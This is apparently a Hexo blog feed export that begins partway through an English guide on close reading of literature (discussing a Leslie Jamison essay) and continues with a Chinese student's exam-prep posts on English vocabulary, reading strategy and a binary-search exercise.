<p>These few observations about Joyce’s language touch on the tone and texture of the passage – the compassion it carries in those rhythms and repetitions. Joyce’s masterful prose needs to be read aloud to be fully appreciated. I hope you agree, and will add reading aloud to your repertoire of reading practices to deepen your pleasure.</p>
<p>NEED TO KNOWWHAT TO DOKEY POINTSLEARN MORELINKS &amp; BOOKS</p>
<h2 id="Key-points"><a href="#Key-points" class="headerlink" title="Key points"></a>Key points</h2><ul>
<li>Reading well will deepen your appreciation of literature; you’ll gain new experiences and enrich your knowledge of the world and other people.</li>
<li>Reading well requires noticing details, reflecting on them and questioning them.</li>
<li>One key to reading well and pleasurably is to slow down, take your time and read deliberatively.</li>
<li>Re-reading literary texts will allow you to pick up on what you missed the first time around and deepen your reading pleasure</li>
<li>Reading aloud, whether a sentence or an entire page, will help you notice more about a writer’s craft and art, especially how the tone and texture complement the meaning.</li>
</ul>
<p>NEED TO KNOWWHAT TO DOKEY POINTSLEARN MORELINKS &amp; BOOKS</p>
<h2 id="Learn-more"><a href="#Learn-more" class="headerlink" title="Learn more"></a>Learn more</h2><p><strong>Join me in a deep-reading experience</strong></p>
<p>To further demonstrate the rewards – of insight and pleasure, of understanding, experience and wisdom – to be reaped from reading literature well (by applying the strategies outlined in this Guide), I invite you to read along with me the opening paragraphs of a recent <a href="https://www.theatlantic.com/magazine/archive/2019/12/garry-winogrand-leslie-jamison/600805/">essay</a>, ‘A Street Full of Splendid Strangers’ (2019), by the American writer Leslie Jamison, originally published in <em>The Atlantic</em> magazine, and reprinted in André Aciman’s edited <a href="https://www.hmhbooks.com/shop/books/The-Best-American-Essays-2020/9780358358589">collection</a> <em>The Best American Essays</em> <em>2020</em>. Here is how Jamison begins her essay:</p>
<blockquote>
<p>When I was young, the beauty of church always belonged to other people: the believers. They saw the same stained glass I saw, but when its jewelled light cut their skin into kaleidoscopic colours, they somehow belonged in that light in a way I never would. They could feel the lilt and soar of the hymns as truth, as collective yearning, as a tin-can telephone connecting them to God. That’s what I told myself. I told myself I was alien to that beauty – I’d never be anything but an interloper lurking just outside its grace.</p>
</blockquote>
<p>Let’s begin with a few observations about the writer’s first sentence. Jamison immediately places us in church; she suggests that being in church can be uplifting for people – a beautiful experience – but that this experience is one she does not share. She emphasises this point with her last four words and her use of the colon. This experience of beauty, Jamison insists, belongs to ‘other people: the believers’. She feels somehow shut out from that experience. That’s a striking admission for jump-starting an essay. You might wonder, as I did, why that might be the case. Jamison answers our question later, but first she tells us what the experience is like for those ‘others’, providing us with vivid details so we can imagine what those ‘believers’ see and hear of beauty in church.</p>
<p>Ironically, she notes that she sees the same stained glass they see, describing vividly its ‘jewelled light’ and ‘kaleidoscopic colours’. In doing so, however, she separates herself from those other believers: ‘they somehow belonged’ Jamison writes, ‘in a way I never would’. Here, again, you might wonder why she doesn’t belong, and perhaps why she suggests that she not only doesn’t belong now, but that she doesn’t see herself as ever belonging, as ever being able to experience the beauty of church as believers do. We might surmise that it has something to do with belief – with faith – and that it is religious faith that separates Jamison from the believers and their more deeply emotional experience of the beauty they experience in church. We don’t know that, of course, but we might infer it, given the way Jamison distinguishes herself from the congregation of believers.</p>
<p>So far, we’re about halfway through that opening paragraph. Slowing down this way to notice and wonder – to ask questions – will likely get you thinking, not only about Jamison’s church experience, but also about your own. Jamison’s details – first visual, then aural – might well evoke the sights and sounds (and perhaps also the tastes and smells) of your own remembered church experiences. In this way, the act of reading is connected with your own life and past. Perhaps you share in the experiences Jamison imagines for the believers she describes or, conversely, perhaps you share Jamison’s experience of self-exclusion. Alternatively, maybe reflection on this passage and the questions it prompts have taken you in other directions entirely.</p>
<p>One of the most striking sentences in Jamison’s first paragraph is the third, the sentence about sounds, where she notes that those other believers could feel the rhythmic ‘lilt and soar of the hymns’. The hymns, she imagines, evoke feeling, emotion, for the believers, though not for Jamison, as she once again separates herself from the ‘truth’ and the ‘collective yearning’ she presumes those believers experience. That sentence about sounds and what they evoke in church, however, has something more in it – another detail: the ‘telephone connecting them to God’. Did you notice and wonder about Jamison’s use of the word ‘tin-can’ to describe the telephone?</p>
<p>What image does she conjure with that adjective? What tone do you hear in that word? A little disdain, perhaps?</p>
<p>We’re undertaking here with this passage what we did earlier in this Guide, as we noticed textual details and raised questions about them, as we slowed down our reading and re-read some sentences, and as we read aloud.</p>
<p>The last two sentences of Jamison’s opening paragraph pivot to what she told herself.</p>
<p>She uses that phrase twice, for emphasis. And what Jamison tells herself is that she’s an ‘interloper’, an ‘alien’ presence, who does not, cannot, and will never share the experience of beauty that the church’s believers possess, noting that she lurks ‘just outside its grace’.</p>
<p>And what a word that is, ‘grace’, to conclude a paragraph about the beauty experienced in church. It’s a loaded word, one appropriate in the context of religious belief and churchgoing, and one that captures well what Jamison is missing, how she lacks the benevolent gift of grace. As you read this concluding sentence, and as you mull over the significance of what Jamison is suggesting in her first paragraph overall, you might wonder where she will go next with her essay. You might wonder whether there could be some other form of grace available to her.</p>
<p>Here is how Jamison continues in her second paragraph:</p>
<blockquote>
<p>Some version of that girl I’d been in church – with legs too long for her denim overalls, and palms covered with half-moon crescents where she’d dug her nails into her skin – was summoned for a different rapture, years later, by the photography of Garry Winogrand. Some version of that girl was told: <em>This is beauty you belong in</em>. The first time I entered the Brooklyn Museum’s 2019 exhibit of his colour photography, part of its force was this immediate sense of invitation, as if a door had been carved in a wall, leading to some new world, and now I could cross into it – or perhaps simply see more clearly that I’d been living in that miraculous world all along. It had only disguised itself as something familiar, or banal.</p>
</blockquote>
<p>Let’s note, first, the splendid, vivid details of that long opening sentence, the description heightened by being sandwiched between the double dashes. Let’s observe, too, how Jamison takes herself and us to another place – to the Brooklyn Museum, a different kind of sublime space, one in which Jamison, and we, can experience beauty unconnected to church and religious faith. Let’s remark, too, on Jamison’s choice of being ‘summoned’, to something she can’t resist, and her choice of ‘rapture’, a word rich in both spiritual and sensual connotations. Jamison feels a special but different kind of grace is something that can be hers, and you might notice that this transcendent experience of beauty is occasioned by an exhibition of colour photographs, an echo perhaps of the church’s coloured stained glass.</p>
<p>Jamison reserves, for the last part of the paragraph, a series of striking images that capture her sense of the splendour and grandeur of seeing Winogrand’s photographs. She concludes the paragraph with the stunning idea that the ‘miraculous world’ Winogrand’s photographs create has been there all along – in the everyday world that Jamison, and we, inhabit. It’s just that she and we haven’t noticed its beauty, and that it takes an artist like Winogrand to open our eyes and hearts and minds to its hidden-in-plain-sight glory. A final irony is that the miraculous beauty Winogrand captures, and that Jamison describes, has not only been available all along, but that it is ‘familiar’, ‘banal’ even. Beauty lurks where we least expect to find it. Glory reveals itself to us in seemingly ordinary moments – if we know where to find it, how to see in those moments an astonishing, luminous radiance.</p>
<p>Are you curious as to what Jamison saw at the exhibition of Winogrand’s photography? Here is a sampling of the pictures she describes in her essay:</p>
<blockquote>
<p>A woman propped on her elbows on her beach towel, a messy MICKEY stick-and-poke tattoo on her arm, cat’s-eye sunglasses hiding her mood. A man lying on his back, with his blue-canvas sneakers tucked beside him and the sunlight pouring across his body, the cigar in his mouth pointed straight up toward the sky … a family having a picnic against a backdrop of rolling white sand dunes; street clowns at a parade beneath a sign advertising DALLAS’ FINEST HAMBURGERS; flight attendants in their powder-blue suits, clustered on an asphalt divider, shadowed by palm trees and boxy, off-white airport hotels.</p>
</blockquote>
<p>What’s especially interesting about the Winogrand photography exhibit is that his pictures were slides that rotated every eight seconds for the horizontal images and every 13 seconds for the vertical images. Viewers observed them more than once, a little at a time, and always in relation to different images appearing on the museum walls. Jamison characterises her experience of the moving images as ‘a tutorial in the proximity of the sacred’, a phrase that takes us back to the notion of ‘grace’ with which she began her essay. Her ‘tutorial’ teaches us to think about what ‘grace’ and the ‘sacred’ might mean for us and how they might manifest in our lives.</p>
<p>Reading with this degree of attention and care brings benefits beyond compare. Reading literary works, including Jamison’s essay, in this way affords some of the same experiences for which Jamison reads and celebrates Winogrand’s photographs: for the shared feelings they evoke, for a sense of other people’s humanity, for a sense of what others care about, for a glimpse of what they do and make and love. Reading literature disciplines us, strengthens our powers of focus, aids our capacity for noticing, prompts our inclination to ask questions and to make connections. Making a habit of reading slowly, carefully, deliberately a work like Jamison’s essay will enable you to participate in a provocative and engaging conversation that leads your thinking in directions you couldn’t have imagined before you started. I invite you to read the rest of Jamison’s splendid essay, which you can find online or in <em>The Best American Essays 2020</em> collection; below, I’ve provided some more suggestions for deeper reading.</p>
<p>NEED TO KNOWWHAT TO DOKEY POINTSLEARN MORELINKS &amp; BOOKS</p>
<h2 id="Links-amp-books"><a href="#Links-amp-books" class="headerlink" title="Links &amp; books"></a>Links &amp; books</h2><p>A few suggestions for deepening your reading pleasure, starting with books then moving on to my recommendations for literary book clubs and podcasts:</p>
<p>I hope my own <a href="https://press.princeton.edu/books/hardcover/9780691206783/you-are-what-you-read">book</a> <em>You Are What You Read</em> (2021) will make you want to read, especially literature. Offering guidance and advice, I demonstrate what engaged, productive reading looks like and feels like through questioning literary works, seeking their embodied truths, discovering their dialectical energies, and engaging with the minds and hearts of writers.</p>
<p>Martin Puchner’s <a href="http://www.randomhousebooks.com/campaign/the-written-world/">book</a> <em>The Written World</em> (2017) is a tour de force that explains how major literary works inscribe the cultures they embody and influence the values those cultures sustain. Through 16 foundational texts from more than 4,000 years of world literature, the author explains how writing has inspired the rise and fall of empires and nations, sparked philosophical and political debates, and led to the emergence of religious beliefs.</p>
<p>Will Schwalbe’s <a href="https://www.penguinrandomhouse.com/books/239719/books-for-living-by-will-schwalbe/">guide</a> <em>Books for Living</em> (2016) offers a celebration of reading in general and an impassioned recommendation of books to shepherd us through our daily lives. He explains why he cherishes each book he discusses, how it helped him in living his own life, and how it broadened and deepened his understanding of the world.</p>
<p>Alberto Manguel’s <a href="https://yalebooks.yale.edu/book/9780300172089/reader-reading">book</a> <em>A Reader on Reading</em> (2011) argues that the activity of reading, in its broadest sense, defines our species. In reading the words on our pages and screens, we enter the worlds they describe and embrace. Topics include the connection between books and our bodies, the power of censorship, the art of translation, and more. Books, contends Manguel, lend coherence to our world and our lives.</p>
<p>The online <a href="https://www.peirenepress.com/borderless-book-club/">series</a> the Borderless Book Club was established by several small European publishing houses to discuss translated literature. In a fortnightly Zoom meeting that can be accessed by anyone, anywhere in the world, the publishers take turns to present a book from their catalogues, and authors and translators are invited to discuss their work. In addition, the selected titles are sometimes discounted.</p>
<p>The Silent Book Club was <a href="https://silentbook.club/">founded</a> in 2012 by two friends in San Francisco, Guinevere de la Mare and Laura Gluhanich, ‘to get out of the house and meet up with a group – and not be forced to make awkward happy-hour conversation, but to sit quietly for an hour and then chat about books,’ de la Mare says. Since then, the club has grown to 260 chapters around the world in 31 countries, providing a place for people ‘to gather in person and online to read together in quiet camaraderie’.</p>
<p>The Literary Friction <a href="https://www.nts.live/shows/literaryfriction">podcast</a> is a conversation about books and ideas, hosted by another two friends, Carrie Plitt in Oxford and Octavia Bright in London. Each month, they interview an author about their book and build the show around a related theme – anything from resistance to coastlines to corpses. Listen in for lively discussion, book recommendations and a little music too.</p>
<p>Finally, I recommend the <a href="https://podcasts.apple.com/gb/podcast/on-the-road-with-penguin-classics/id1549179379">podcast</a> On the Road with Penguin Classics in which the team takes a stroll around the world’s favourite books. Hosted by the writer and editor Henry Eliot, <a href="https://www.penguin.co.uk/books/307215/the-penguin-classics-book/9780241320853.html">author</a> of <em>The Penguin Classics Book</em> (2018), each week the podcast heads to a different literary location to explore a book in the company of readers.</p>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>扩展读物</category>
        <category>英语</category>
      </categories>
      <tags>
        <tag>英语</tag>
      </tags>
  </entry>
  <entry>
    <title>词汇回顾</title>
    <url>/2021/08/06/%E8%AF%8D%E6%B1%87%E5%9B%9E%E9%A1%BE/</url>
    <content><![CDATA[<ul>
<li>count on</li>
</ul>
<p>依赖、指望</p>
<ul>
<li>the side effect</li>
</ul>
<p>副作用</p>
<ul>
<li>in time of</li>
</ul>
<p>在。。。时间</p>
<ul>
<li>go into</li>
</ul>
<p>进入</p>
<ul>
<li>be make up with</li>
</ul>
<p>弥补</p>
<p>个人理解：是。。。上去 -&gt; 弥补</p>
<ul>
<li>borne</li>
</ul>
<p>承担</p>
<ul>
<li>deductibles</li>
</ul>
<p>免赔额</p>
<ul>
<li>the odds of </li>
</ul>
<p>。。的几率</p>
<p>odd 赔率</p>
<ul>
<li>get back alive </li>
</ul>
<p>活过来了、劫后余生</p>
<ul>
<li>四个形容词在前面修饰名词做搭配：</li>
</ul>
<p>作者刻意为之，是为了表明、描述细节</p>
<ul>
<li>fashion 时髦</li>
</ul>
<p>To fashion something means to built it, </p>
<p>as in “We fashioned a shelter out of rocks and mud.” But that kind of fashioning probably isn’t in fashion these days.</p>
<ul>
<li><p>check 检查</p>
<p>A few of the many meanings of <em>check:</em> As a noun: the act of restraining power or action</p>
</li>
</ul>
<ul>
<li><p>to say the least</p>
<p>至少来说</p>
</li>
<li><p>at last</p>
<p>终于</p>
<p>free(v.) at last     终于自由了</p>
<p>progress(n.) at last        最后的进展</p>
</li>
<li><p>straight up </p>
<p>直截了当</p>
</li>
<li><p>cloak</p>
<p>伪装</p>
</li>
<li><p>vague</p>
<p>模糊的</p>
</li>
<li><p>by no means uniformly</p>
<p>绝不是均匀的</p>
</li>
<li></li>
</ul>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>考研</category>
        <category>英语</category>
      </categories>
      <tags>
        <tag>考研</tag>
        <tag>英语</tag>
      </tags>
  </entry>
  <entry>
    <title>词汇的魅力</title>
    <url>/2021/08/06/%E8%AF%8D%E6%B1%87%E7%9A%84%E9%AD%85%E5%8A%9B/</url>
    <content><![CDATA[<h1 id="搭配，用法"><a href="#搭配，用法" class="headerlink" title="搭配，用法"></a>搭配，用法</h1><ol>
<li><p>the fact that she never inquired how the stories <em><strong>arrived</strong></em>.</p>
</li>
<li><p><em><strong>well-</strong></em> paid 高薪</p>
</li>
<li><p>rather than dieting <em><strong>their way to</strong></em> size zero or wasp-waist physiques ．而不是通过节食来达到零码或黄蜂腰身形</p>
</li>
<li><p>it’s <em><strong>just</strong></em> not fair.  这实在是不公平</p>
</li>
<li><p>His concern is mainly with the humanities: literature, languages, philosophy <em><strong>and so on</strong></em>之类的等等一系列</p>
</li>
<li><p>Equally unsurprisingly, only about half <em><strong>end up with</strong></em> professorships for which they entered graduate school.最终获得</p>
</li>
<li><p>thesis-writing 论文写作</p>
</li>
<li><p>in just a tenth of a second 在1/10秒内            a second 一秒钟</p>
</li>
<li><p>come up with  提出</p>
</li>
<li><p>stems from 源于</p>
</li>
<li><p>in a move that在一次行动中</p>
</li>
<li><p>in the wake of 随着</p>
</li>
<li><p><em><strong>the turn of</strong></em> 20th century 20世纪初</p>
</li>
<li><p><em><strong>the eve of</strong></em> World War II 二战前夕</p>
</li>
<li><p>to the point of = to the degree = to a stage 到了。。。的地步</p>
</li>
<li><p>even those reviewers who <em><strong>wore their learning lightly</strong></em> 甚至是那些喜欢卖弄学问的评论家们</p>
</li>
<li><p>I am tempted to define ‘journalism’ as ‘a term of contempt applied by writers who are not read to writers who are.</p>
</li>
</ol>
<p>我很想将‘新闻业’定义为‘一个不被读过的作家对读过的作家的蔑视术语。’</p>
<ol start="18">
<li>save to 除了</li>
<li>it turn out that 事实证明</li>
<li>in several instance 在几种情况下</li>
<li>on the whole 总体上</li>
<li>To a certain extent 在某种程度上</li>
<li>is hardly the only 并不是唯一的</li>
<li>a piece of cake 小菜一碟</li>
<li>no shock there 不要惊讶</li>
<li>play a major role 起主要作用</li>
<li>a broad range of范围广泛的</li>
<li>promote complementary 促进互补</li>
<li>vague excuses 模糊的借口</li>
<li>the first signs of 最初的迹象</li>
<li>to be between jobs 失业</li>
<li>wing by wing 一个接一个</li>
<li>in return for 作为回报</li>
<li>it’s not yet clear 尚不清楚</li>
<li>fatal flaw 致命缺陷</li>
<li>couldn’t be more out of date</li>
<li>more precisely 更准确地</li>
<li>In the past couple of weeks 在过去几周</li>
<li>Human nature being what it is 人类本来就是这样</li>
<li>It is not yet clear 目前还不清楚</li>
<li>after all 毕竟</li>
<li>our visions of future 未来愿景</li>
<li>Up until a few decades ago 直到十几年前</li>
<li>writing on the wall  厄运当头</li>
<li>a state of exhaustion 精疲力竭的状态</li>
<li>sets out to correct 着手纠正</li>
<li>It is difficult to the point of impossibility for 很难（难到不可能的地步）</li>
<li>it was taken for granted that 人们理所当然的认为</li>
<li>perched on top 居高临下</li>
<li>to put it in layman’s terms</li>
<li>it was lucky <em><strong>indeed</strong></em> there were no injuries</li>
<li>it is disturbing that 令人警惕的是</li>
<li>oversight panel</li>
<li>to the contrary 相反的是</li>
<li>own board of directors 董事会</li>
<li>the fallout from 后果是</li>
<li>it remains unclear 仍然不清楚</li>
<li> shift away 转变</li>
<li>Not all of that will change. 并非所有这些都会改变。</li>
<li>for up to a century 长达一个世纪</li>
<li>But the implications will be profound. 但其影响将是深远的</li>
<li>Tropical coral reefs deserve their status as charismatic habitats. 热带珊瑚礁作为具有魅力的栖息地是理所当然的。</li>
<li> comes out of shadows into public markets 从暗处走到公众市场内。</li>
<li>pull off a list.列出一份清单</li>
<li>The deal values it at about $1.5bn.    这笔交易对其估值约为 15 亿美元。</li>
<li>a clutch of 批量的，一些的</li>
<li>This month <em><strong>alone</strong></em> 仅此月</li>
<li>The rush to 。。。急于做某事</li>
<li>in these early-stage efforts 在这些早期的努力中</li>
<li>along with the <strong>tranche</strong> of new start-ups spinning off 随着一批新的初创企业分拆出来</li>
<li>that moment of truth 关键时刻</li>
<li><em><strong>It would increase the chances of</strong></em> greater famine and ecosystem collapse. 这将增加更大的饥荒和生态系统崩溃的机会</li>
<li>China, <em><strong>by far the world’s biggest emitter of</strong></em> greenhouse gases 中国是迄今为止世界上最大的温室气体排放国，</li>
<li>time is running out  时间不多了</li>
<li>Britain, as the hosts of Cop26, will <em><strong>hold the ring over the next two weeks</strong></em> 英国作为 Cop26 的东道主，将在接下来的两周内举行</li>
<li>What is done and left undone 已完成的和未完成的</li>
<li>the fate of future generations 后代的命运</li>
<li>Progress in AI is something that will take a while to happen 人工智能的进步需要一段时间才能发生</li>
<li>dating back to 2008. 可追溯到2008年。</li>
<li>in the higher reaches of the sport 体育运动的上游。</li>
<li>ascended the throne 登基</li>
<li>No one says that the N.H.L. <strong>is anything less than</strong> the world’s top league.什么都比不上</li>
</ol>
<h1 id="特殊句式"><a href="#特殊句式" class="headerlink" title="特殊句式"></a>特殊句式</h1><p>The company is blamed for <em><strong>sucking sales out of Britain’s high streets</strong></em> and <em><strong>threatening to automate workers out of existence.</strong></em></p>
<p>该公司被指责从英国的大街上吸走销售，并威胁要让工人自动化。</p>
<p>It says more about the decrepit state of the care sector <em><strong>than Amazon’s warehouses that workers are choosing the latter over the former.</strong></em></p>
<p>相比亚马逊的仓库，工人选择后者而不是前者，更能说明护理行业的破旧状态。</p>
<p><code>Bluntly it had no clue how prevalent the wheel defect mightbe, nor how frequent inspections would have to be to detect it.</code></p>
<p>坦率地说，它不知道车轮缺陷可能有多普遍，也不知道需要多频繁的检查才能发现它</p>
<p><code>What else don ’ t we know about Metro safety issues?</code></p>
<p>关于地铁安全问题，我们还有什么不知道的？</p>
<p><code>if auto manufacturers are less able to differentiate themselves by designing more powerful engines — especially as vehicles become self-driving — they will have to compete by making their cars more attractive places to be.</code></p>
<p>如果汽车制造商无法通过设计更强大的发动机来实现差异化——尤其是随着汽车变得自动驾驶——他们将不得不通过让他们的汽车更具吸引力的地方来竞争。</p>
<p><strong>But as awareness grows of the role that oceans can play in</strong> <strong>sequestering</strong> <strong>carbon, and marine conservation efforts ramp up as part of global efforts to limit warming and biodiversity losses, we should cultivate our appreciation for other ecosystems too</strong>.</p>
<p>但随着人们越来越意识到海洋在固碳方面的作用，以及作为全球限制变暖和生物多样性丧失的努力的一部分，海洋保护工作的增加，我们也应该培养对其他生态系统的欣赏。</p>
<p>the menopause is being <code>talked about a great deal more than it used to be.</code></p>
<p>更年期的讨论比过去多得多.</p>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>英语</category>
        <category>随记</category>
        <category>有趣的新发现</category>
      </categories>
      <tags>
        <tag>英语</tag>
      </tags>
  </entry>
  <entry>
    <title>关于对陈兔兔的后续感叹与反思</title>
    <url>/2021/08/05/%E5%85%B3%E4%BA%8E%E5%AF%B9%E9%99%88%E5%85%94%E5%85%94%E7%9A%84%E5%90%8E%E7%BB%AD%E6%84%9F%E5%8F%B9%E4%B8%8E%E5%8F%8D%E6%80%9D/</url>
    <content><![CDATA[<p>原本是想去陈老师的公众号翻一下有没有关于英语精读的方法文章，偶然发现了陈老师对单词原本含义的解释。大概意思就是，比如一个单词，interesting，陈老师说的，他其实也会表不好的意思，并且陈老师会经常<strong>查文献</strong>，用文献来充实自己。</p>
<p>基于这一点，我于是在之前数次的阅读中效仿这个方法，但是我，好像还是没能找到这么细致，也不知道怎么找到相关文献。于是我就用自己的<strong>野方法</strong>，先去搜关于如何精读的文章，然后我就发现了一些他们推荐的权威查词查字查短语的网站，然后就把这个单词输入进去，看和陈老师说的一样的网站解释，于是我发现了这个</p>
<p><em><strong>interesting</strong></em></p>
<p>When you’re giving a speech, you probably hope that your audience is gazing at you in fascination because what you’re saying is so <em>interesting</em>, and not because you’ve got something weird on your face.</p>
<blockquote>
<p>The adjective <em>interesting</em> describes something that makes you curious, or catches your attention, but sometimes people use the word in a doubtful way when they are taken aback but want to be polite. Like if your grandmother looks at your new tattoo and says, “Well, that’s certainly <em>interesting</em>!” Chances are she’s not actually feeling very enthusiastic about your choice of body art.</p>
</blockquote>
<p>但是这只是用网站查了，而陈老师是直接找的文献，读的文献，这一点，至少我做不到。</p>
<p>不过这个网站我记住了，以后查词的时候我一定看完。</p>
<p>但又有另一个点困惑我，interesting这个词算是简单的词汇，陈老师能有时间去发现，可是在我读的过程中，是没有这么多时间精读的，所以，只能靠时间去堆积，说不定英语看多了就能发现这些规律。</p>
<p>遗憾的是陈老师没有其他的著作，除开考研以外，我暂时找不到一个可以和陈老师匹拟的人。</p>
<p>从陈老师那里，我也明白了对一件事情需要认真到什么程度。考研加油！</p>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>自我探索</category>
        <category>英语</category>
        <category>陈仲凯老师</category>
      </categories>
      <tags>
        <tag>思考</tag>
      </tags>
  </entry>
  <entry>
    <title>A nice day</title>
    <url>/2021/08/02/it&#39;s-nice-day/</url>
    <content><![CDATA[<p><img src="https://ckcah.github.io/images/me/hand.jpg" alt="hand"></p>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <tags>
        <tag>me</tag>
      </tags>
  </entry>
  <entry>
    <title>英语词源故事集锦</title>
    <url>/2021/08/02/%E8%8B%B1%E8%AF%AD%E8%AF%8D%E6%BA%90%E6%95%85%E4%BA%8B%E9%9B%86%E9%94%A6/</url>
    <content><![CDATA[<object data="https://ckcah.github.io/books/英语词源故事集锦.pdf" type="application/pdf" width="100%" height="980px">

</object><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>扩展读物</category>
      </categories>
      <tags>
        <tag>喜欢</tag>
      </tags>
  </entry>
  <entry>
    <title>数据结构自我探索1</title>
    <url>/2021/08/02/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E8%87%AA%E6%88%91%E6%8E%A2%E7%B4%A21/</url>
    <content><![CDATA[<p><img src="https://ckcah.github.io/images/DS/answer1.png" alt="image-20210801161555987"></p>
<p><strong>答案</strong>：A      D</p>
<p><em>第一空：</em></p>
<p>因为有12个关键字，</p>
<p>所以构成了高度为4的二叉树</p>
<span id="more"></span>

<p>前3层关键字总数为7，第4层有5个关键字</p>
<p>则，前3层，查找总长度 =第一层个数 * 第一层查找长度（1） + 第二层个数 * 第二层查找长度（2）+ 第三层个数（4）  * 第三层查找长度（3） = 1 + 4 + 12 = 17</p>
<p>第四层，查找总长度 = 第四层查找长度（4） * 第五层个数（5） = 20</p>
<p>总个数为 12个，所以查找成功的平均查找长度 = （17 + 20） /  12</p>
<p><em>第二空：</em></p>
<p>其实是找二叉树中叶子结点需要找的次数</p>
<p>根据上边第一问推论的二叉树的样子，可以看出</p>
<p>第4层有3个叶子结点</p>
<p>第5层有 5 * 2 个叶子结点</p>
<p>共13个叶子结点</p>
<p>第四层查找失败的总长度 = 叶子结点个数（3） * 证明它不存在需要经过的关键字（3）  = 9</p>
<p>第五层查找失败的总长度 =  叶子结点个数（10） * 证明它不存在需要经过的关键字（4） = 40</p>
<p>所以最后得出查找失败的平均查找长度 = （9 + 40） / 13</p>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>考研</category>
        <category>408</category>
        <category>小领悟</category>
      </categories>
      <tags>
        <tag>考研</tag>
      </tags>
  </entry>
  <entry>
    <title>陈兔兔阅读专项班-截至16text2 总结</title>
    <url>/2021/08/02/%E9%99%88%E5%85%94%E5%85%94%E8%80%81%E5%B8%88%E9%98%85%E8%AF%BB%E4%B8%93%E9%A1%B9%E7%8F%AD-%E6%88%AA%E8%87%B316text2-%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h3 id="杂论"><a href="#杂论" class="headerlink" title="杂论"></a>杂论</h3><p>单词、短语的替换（作者、出题人经常干的事）   我却经常忘记的事</p>
<p>强调句                句型                介词                时态</p>
<p>段与段之间的关系（最好是每读一段就分析一段）（主旨段、支持段 正反例？）</p>
<p>具体 -&gt; 概括                        概括  -&gt;  具体</p>
<p>长难句一定要去分析主语、造成的后果、包含了什么</p>
<p>从概括到具体（一般具体为关注点）</p>
<p>写作思路：从概括到具体、例证（一般为关注点）</p>
<p>单词也存在首尾呼应</p>
<p>每一段找主旨句</p>
<p>转折（but。。。）：1.表强调</p>
<p>​                                        2.表反对</p>
<p>主旨句回看</p>
<p>不同角色的对比（行为、表面）：一般最不同的那个就是出题点</p>
<p>如何理解主题句和支持句的关系：</p>
<p>主题句为主</p>
<p>支持句也要看，支持手段只是为了让你更深理解（会作为选项迷惑学生）学会透过例子看主旨</p>
<p>支持手段：引用、数据、例子</p>
<p>对比：1.不同之处</p>
<p>​            2.相同之处</p>
<p>类比</p>
<p>出题人更倾向于考新的（当新旧同时出现时）</p>
<p>今昔对比</p>
<p>看完第1段（总结）、第2段后，看第1段重要的事情在第2段中提到了几个，若没说完，则下一段极大可能就是另一个点</p>
<p>（猜测下一段主旨）</p>
<p>句子中可能存在暗示（作者的态度、倾向）（透过现象看本质）（词性的“好坏”）</p>
<p>段研究局限性</p>
<p>后一段的第一句有可能是上一段的总结（明示）</p>
<p>避免就题讲题（看根源）</p>
